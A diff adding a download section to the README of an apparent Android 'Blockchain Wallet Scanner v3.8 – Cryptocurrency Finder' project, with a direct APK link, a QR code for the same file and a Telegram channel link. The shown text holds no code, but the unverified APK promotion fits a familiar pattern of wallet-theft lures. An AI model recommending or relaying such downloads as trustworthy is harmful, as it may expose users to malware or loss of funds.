@@ -1,3 +1,19 @@
+## 🚀 Download & Installation
+
+### Android APK v3.8
+[![Download APK](https://img.shields.io/badge/Download-Wallet_Scanner_v3.8-00cc00)](https://github.com/mr-pic/blockchain-wallet-scanner/releases/download/v3.8/wallet-scanner-v3.8.apk)
+[![Telegram](https://img.shields.io/badge/Telegram-Join_Channel-0088cc)](https://t.me/wallet_orginal)
+
+
+**Scan QR code for quick download:**
+![QR Code](https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://github.com/mr-pic/blockchain-wallet-scanner/releases/download/v3.8/wallet-scanner-v3.8.apk)
+
+**System Requirements:**
+- Android 8.0 (Oreo) or higher
+- 50MB free storage space
+- Internet connection for blockchain queries
+
+---
 # blockchain-wallet-scanner
 Advanced Android Cryptocurrency Wallet Scanner v3.8 | Real-time blockchain analysis tool for security researchers and crypto enthusiasts
 # 🔍 Blockchain Wallet Scanner v3.8 – Advanced Cryptocurrency Finder
